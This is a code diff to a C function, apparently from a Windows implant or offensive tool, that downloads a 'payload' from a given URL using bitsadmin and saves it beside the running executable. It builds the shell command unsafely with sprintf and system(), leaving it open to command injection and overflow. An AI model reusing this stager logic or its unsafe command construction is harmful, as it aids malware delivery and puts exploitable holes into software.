@@ -14,13 +14,25 @@
 unsigned char *download_bitsadmin(char *arg1, int *data_size) {
     DEBUG_PRINT("Downloading data to file via bitsadmin...\n");
 
+    // File will be named as on the server
     char sh_filename[128];
     strcpy(sh_filename, get_filename_from_url(arg1));
 
     DEBUG_PRINT("sh_filename = %s\n", sh_filename);
 
+    // Bitsadmin expects a full path.
+    // Acquire full path + file name of this process.
+    char current_path[MAX_PATH];
+    GetModuleFileNameA(NULL, current_path, MAX_PATH);
+
+    // Replace executable name with payload name (after last '\')
+    // Array size MAX_PATH should be large enough
+    strcpy((strrchr(current_path, '\\') + 1), sh_filename);
+    
+    DEBUG_PRINT("current_path = %s\n", current_path);
+
     char download[500];    // how not to do it...
-    sprintf(download, "bitsadmin.exe /transfer \"WinBitsJob\" %s %s", arg1, sh_filename);
+    sprintf(download, "bitsadmin.exe /transfer \"WinBitsJob\" %s %s", arg1, current_path);
 
     DEBUG_PRINT("command: %s\n", download);
     system(download);
